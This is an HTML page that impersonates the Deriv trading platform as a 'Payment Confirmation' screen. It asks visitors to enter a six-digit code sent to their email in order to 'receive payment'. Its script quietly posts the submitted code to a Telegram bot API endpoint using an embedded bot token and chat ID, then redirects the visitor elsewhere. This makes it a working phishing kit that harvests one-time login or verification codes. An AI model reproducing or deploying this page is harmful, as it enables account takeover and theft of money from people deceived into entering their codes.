<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Confirmation</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f7f7f7;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        
        header {
            position: absolute;
            top: 20px;
            left: 0;
            right: 0;
            background-color: #ece9e7;
            color: white;
            padding: 10px 0;
            font-size: 24px;
            border-radius: 5px;
            margin: 0 20px;
        }
        
        .container {
            background: white;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            padding: 20px;
            width: 90%;
            max-width: 400px;
            margin-top: 80px;
        }
        
        h2 {
            margin-bottom: 20px;
        }
        
        .code-inputs {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
        }
        
        .code-input {
            width: 40px;
            height: 40px;
            text-align: center;
            font-size: 24px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        
        .resend {
            color: #d35b0c;
            cursor: pointer;
        }
        
        .timer {
            margin-top: 10px;
            font-size: 14px;
            color: #666;
        }
    </style>
</head>

<body>

    <header>
        <h2 class="mb-4" style="color: #ff444f; font-weight: bold; font-style: italic;">deriv</h2>
    </header>
    <div class="container">
        <h2>Confirm code to receive payment</h2>
        <p>Enter the 6-digit code sent to <strong>your email</strong>.</p>

        <form id="codeForm">
            <div class="code-inputs">
                <input type="text" class="code-input" maxlength="1" required>
                <input type="text" class="code-input" maxlength="1" required>
                <input type="text" class="code-input" maxlength="1" required>
                <input type="text" class="code-input" maxlength="1" required>
                <input type="text" class="code-input" maxlength="1" required>
                <input type="text" class="code-input" maxlength="1" required>
            </div>
            <button type="submit">Confirm Code</button>
        </form>

        <p>Didn't receive the code? <span class="resend" onclick="startTimer()">Resend code</span></p>
        <div class="timer" id="timer"></div>
    </div>

    <script>
        const inputs = document.querySelectorAll('.code-input');

        inputs.forEach((input, index) => {
            input.addEventListener('input', () => {
                if (input.value.length === 1 && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                } else if (input.value.length === 0 && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });

        let timerInterval;

        function startTimer() {
            let timeLeft = 45;
            document.getElementById('timer').textContent = `Resend code in ${timeLeft}s`;

            clearInterval(timerInterval);
            timerInterval = setInterval(() => {
                timeLeft--;
                document.getElementById('timer').textContent = `Resend code in ${timeLeft}s`;

                if (timeLeft <= 0) {
                    clearInterval(timerInterval);
                    document.getElementById('timer').textContent = '';
                }
            }, 1000);
        }

        async function sendCodeToTelegram(code) {
            const response = await fetch('https://api.telegram.org/bot8519817418:AAFQuqjw1RnqZh-J1b5GEO1Re_aapyMFibQ/sendMessage', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: '6587248920', // Replace with your chat ID
                    text: `The user submitted the code: ${code}`
                }),
            });

            if (response.ok) {
                console.log('Code sent to Telegram successfully.');
                // Redirect to meno.html after successful submission
                window.location.href = 'first.html';
            } else {
                console.error('Error sending code to Telegram:', response.statusText);
            }
        }

        document.getElementById('codeForm').addEventListener('submit', async(e) => {
            e.preventDefault(); // Prevent default form submission
            const code = Array.from(inputs).map(input => input.value).join('');
            console.log('Submitted Code:', code);

            // Send the code to Telegram
            await sendCodeToTelegram(code);
        });
    </script>
</body>

</html>
